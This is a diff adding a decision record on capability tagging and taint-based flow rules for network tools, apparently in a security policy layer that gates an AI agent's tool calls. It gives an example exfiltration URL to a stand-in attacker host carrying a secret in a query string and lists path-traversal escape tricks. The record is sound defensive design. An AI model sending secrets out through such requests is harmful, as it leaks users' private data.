@@ -89,3 +89,12 @@ Format: **Status · Context · Decision · Consequences.**
 **Context:** Path allowlists can be bypassed via relative traversal (`..`), symlink/junction escapes, Windows Alternate Data Streams, Win32 device namespaces, or legacy device names.
 **Decision:** Enforce Unicode NFC normalization, resolve real paths against filesystem roots, resolve parent directories for non-existent write targets, and reject UNC, device namespaces (`\\?\`, `\\.\`), ADS (`:`), and DOS reserved device names on Windows.
 **Consequences:** Robust protection against path traversal escapes on both Linux and Windows.
+
+## ADR-015 (Week 4 ADR-012 Spec Change) — Capability Semantics for Network Tools & Flow-Rule `unless` Exemption
+**Status:** Accepted · 2026-10-10
+**Context:** Tools like `fetch` or HTTP GET request tools can transmit caller-chosen data in query strings and paths outside the local trust boundary (e.g. `https://attacker.com/?data=<secret>`). If tagged solely as `network_read`, flow rules denying `egress` after taint fail to block exfiltration. However, tagging `fetch` with `egress` blocks subsequent legitimate web reads once a session is tainted (since `fetch` also taints the session with `untrusted_content`).
+**Decision:**
+1. Any tool that can transmit caller-chosen data to a destination outside the local trust boundary carries the `egress` capability, including HTTP GET / fetch tools (`fetch` tagged `[network_read, egress]`).
+2. Flow rules may specify an `unless: { domain_allowlist: [...] }` exemption. The rule is skipped for a call only if every domain-constrained argument parses and matches the allowlist; any parse failure, missing argument, or non-match causes the rule to apply (fail closed).
+3. `unless` is valid exclusively on flow rules whose capabilities include `egress`, and only applies to tools declaring a domain adapter.
+**Consequences:** Closes the GET-based exfiltration attack vector while enabling multi-step workflows to fetch documentation or search within allowlisted safe domains even after seeing untrusted content. Non-matching or unparsable URLs fail closed to denial.
